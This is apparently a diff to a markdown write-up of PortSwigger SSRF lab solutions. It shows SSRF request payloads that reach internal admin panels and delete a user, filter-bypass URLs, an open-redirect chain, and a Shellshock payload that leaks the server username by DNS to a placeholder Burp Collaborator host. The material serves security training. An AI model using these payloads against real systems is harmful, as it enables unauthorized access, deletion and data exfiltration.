@@ -84,7 +84,9 @@ Use SSRF to access the following URL and delete the user carlos.
 http://localhost/admin
 ```
 
-> [!note]- Solution
+> <details>
+> <summary>**Solution**</summary>
+> 
 > This lab features a shopping application that showcases various items for sale. Each item has a specific link that provides its details. For example:
 > 
 > ```
@@ -127,6 +129,7 @@ http://localhost/admin
 > stockApi=http://localhost/admin/delete?username=carlos
 > ```
 > To solve the lab, send the request with the provided URL in the `stockApi` parameter.
+> </details>
 
 In the previous lab, we encountered an obstacle when trying to directly access the `/admin` endpoint due to configured access controls. However, we discovered that we can bypass these controls by exploiting the SSRF vulnerability. Let's delve into the details of how this happens:
 
@@ -160,7 +163,9 @@ Lab URL: [https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backe
 
 Use SSRF vulnerability to access the admin panel that lies in between the `192.168.0.X` address range with port `8080`. After that use that to delete the user's `carlos` account to solve the lab.
 
-> [!note]- Solution
+> <details>
+> <summary>**Solution**</summary>
+> 
 > This lab focuses on a shopping application that showcases various items for sale. Each item has its own details page, which can be accessed through specific links. For example:
 > 
 > ```
@@ -256,6 +261,7 @@ Use SSRF vulnerability to access the admin panel that lies in between the `192.1
 > ```
 > 
 > By sending the above request, we can successfully delete the user "carlos" and solve the lab.
+> </details>
 
 In the above lab even though we didn't have access to the admin panel but the application is managing the Admin panel internally and they are not protected by any authentication mechanisms. This makes him more critical in an SSRF point of view.  
 
@@ -290,7 +296,9 @@ Bypass blacklist-based defense approach and achieved the state of SSRF attack. T
 http://localhost/admin
 ```
 
-> [!note]- Solution
+> <details>
+> <summary>**Solution**</summary>
+> 
 > This lab features a shopping application that showcases various items for sale. Each item has a specific link that provides its details. For example:
 > ```
 > https://0ac5002103ef35828136085f00620098.web-security-academy.net/product?productId=1
@@ -346,6 +354,7 @@ http://localhost/admin
 > 
 > stockApi=http://127.1/Admin/delete?username=carlos
 > ```
+> </details>
 
 This lab demonstrates the utilization of a flawed blacklisting approach to safeguard sensitive endpoints. While this approach can be effective when properly configured, it is crucial to implement a more robust and comprehensive method that blocks all requests that go toward the local system.
 
@@ -381,7 +390,9 @@ Bypass whitelist-based defense approach and achieved the state of SSRF attack. T
 http://localhost/admin
 ```
 
-> [!note]- Solution
+> <details>
+> <summary>**Solution**</summary>
+> 
 > This lab features a shopping application that showcases various items for sale. Each item has a specific link that provides its details. For example:
 > ```
 > https://0ac5002103ef35828136085f00620098.web-security-academy.net/product?productId=1
@@ -450,6 +461,7 @@ http://localhost/admin
 > ```
 > http://localhost%25%32%66admin%2523@stock.weliketoshop.net/admin/delete?username=carlos
 > ```
+> </details>
 
 ### Bypassing SSRF filters via open redirection
 
@@ -489,7 +501,9 @@ Bypass the whitelisted-based input filters by chaining them with open redirectio
 http://192.168.0.12:8080/admin
 ```
 
-> [!note]- Solution
+> <details>
+> <summary>**Solution**</summary>
+>
 > This lab features a shopping application that showcases various items for sale. Each item has a specific link that provides its details. For example:
 > ```
 > https://0ac5002103ef35828136085f00620098.web-security-academy.net/product?productId=1
@@ -551,6 +565,7 @@ http://192.168.0.12:8080/admin
 > stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos
 > ```
 > This illustrates how SSRF can be chained with an open redirect vulnerability for increased effectiveness.
+> </details>
 
 ## Blind SSRF Vulnerability
 
@@ -579,7 +594,9 @@ Lab URL: [https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detect
 
 This lab contains analytics software that fetches the URL specified in the Referer header when the product page is loaded. Use this functionality to make requests to another server (Burp Collaborator).
 
-> [!note]- Solution
+> <details>
+> <summary>**Solution**</summary>
+>
 > This lab focuses on a shopping application that includes Referer headers in its requests originating from the main page (/). The requests follow the structure below:
 > ```
 > GET /product?productId=1 HTTP/2
@@ -600,6 +617,7 @@ This lab contains analytics software that fetches the URL specified in the Refer
 > Referer: https://pf80y51u0yfhmb9wjifate12zt5jt8.oastify.com/
 > ```
 > Alternatively, services like [interactsh](https://app.interactsh.com/#/) can be used, which provide a random URL instance and display the response when someone connects to it. However, in this lab, we need to use the Burp Collaborator instance to solve the task.
+> </details>
 
 As already mentioned simply seeing blind SSRF vulnerability doesn't means its a big impact in all the black box cases because we cannot guess the route that can be exploited since we cannot view the response from the back-end request, the behavior can't be used to explore content on systems that the application server can reach. 
 
@@ -613,17 +631,15 @@ Lab URL: [https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploit
 
 This lab contains analytics software that fetches the URL specified in the Referer header when the product page is loaded. Use this functionality to make requests to the internal network in the `192.168.0.x` address range on port `8080`. Use shellshock payload that exfiltrates the name of the user to an attacker-controlled server(Burp Collaborator).
 
-> [!note]- Solution
+> <details>
+> <summary>**Solution**</summary>
+>
 > This lab is a continuation of our previous Blind SSRF lab. In this lab, we focus on exploiting the Shellshock vulnerability through the Referer header. The objective is to execute system commands and exfiltrate the server's username using a Shellshock payload.
-
 > The Shellshock payload used is as follows:
-
 > ```
 > () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
 > ```
-
 > To exploit the vulnerability, we need to include this payload in the User-Agent header due to the nature of the Shellshock vulnerability. In Burp Intruder, we can send the request with the modified Referer header, such as http://192.168.0.1:8080, and specify the position of the octet we want to change. We set the attack type to Sniper, payload type to Number and the range between 1 and 255 with a step of 1 and max fraction digit set to 0. The complete request in the Intruder looks like the following:
-
 > ```
 > GET /product?productId=1 HTTP/2
 > Host: 0aaf00b0031373578171a8cf008300e7.web-security-academy.net
@@ -632,6 +648,7 @@ This lab contains analytics software that fetches the URL specified in the Refer
 > Referer: http://192.168.0.§x§:8080
 > ```
 > Initiate the Intruder attack, and you will observe a callback in your Burp Collaborator instance. The DNS query is made, revealing the username peter-Q9WC9L. This confirms the successful execution of the command on the server. Submit the obtained username from your Burp Collaborator instance to complete this lab.
+> </details>
 
 Blind SSRF vulnerabilities can also be exploited by manipulating the application to establish connections with a system controlled by the attacker. By doing so, the attacker can craft malicious responses that are returned to the HTTP client initiating the connection. If the attacker can identify and exploit a critical vulnerability on the client side of the server's HTTP implementation, it may be possible to execute remote code within the application's infrastructure. This can lead to significant compromise and potential control over the affected system.
 
